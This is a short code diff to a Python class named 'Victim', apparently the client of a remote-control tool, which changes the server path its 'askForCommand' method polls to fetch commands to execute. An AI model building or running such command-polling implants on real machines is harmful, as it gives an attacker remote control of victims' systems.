@@ -45,7 +45,7 @@ class Victim:
 
     # Ask for a command to execute
     def askForCommand(self):
-        return self.__session.request('GET', self.__serverUrl + '/victim.php', params={'askingForCommand': 1}).text
+        return self.__session.request('GET', self.__serverUrl + '/victim/victim.php', params={'askingForCommand': 1}).text
 
 
     def disconnectFromServer(self):
